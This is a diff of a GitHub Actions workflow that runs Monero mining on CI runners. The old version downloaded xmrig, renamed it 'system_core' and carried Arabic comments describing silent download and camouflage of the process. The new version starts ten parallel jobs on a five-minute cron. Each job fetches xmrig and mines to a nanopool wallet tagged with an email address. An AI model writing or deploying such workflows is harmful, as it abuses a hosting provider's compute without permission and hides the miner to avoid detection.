@@ -1,31 +1,68 @@
-name: Max-Whale-X4-NonStop
+name: Ultimate-Whale-X10
 on:
   push:
     branches: [ main ]
   workflow_dispatch:
   schedule:
-    - cron: "*/5 * * * *" # نبضة كل 5 دقائق للتأكد من التشغيل
+    - cron: "*/5 * * * *"
 
 jobs:
-  mining-fleet:
+  worker-1:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        # هنا بنفتح 4 سيرفرات مستقلة تماماً داخل الحساب
-        worker_id: [1, 2, 3, 4]
     steps:
-      - name: System-Setup
-        run: |
-          # تحميل صامت وتمويه العملية
-          curl -L -o sys_module.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
-          tar -xf sys_module.tar.gz
-          mv xmrig-6.21.0/xmrig ./system_core
-          chmod +x system_core
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-1/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+  
+  worker-2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-2/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
 
-      - name: Live-Mining
-        run: |
-          # التشغيل بـ 2 ثريدز لكل عامل لضمان استلام الهاش
-          ./system_core -o xmr-eu1.nanopool.org:14444 \
-          -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX4-${{ matrix.worker_id }}/nfdr065@gmail.com \
-          --algo rx/0 -p x --donate-level 1 -t 2
+  worker-3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-3/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-4/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-5/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-6:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-6/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-7:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-7/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-8:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-8/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-9:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-9/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+
+  worker-10:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start
+        run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.W-10/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
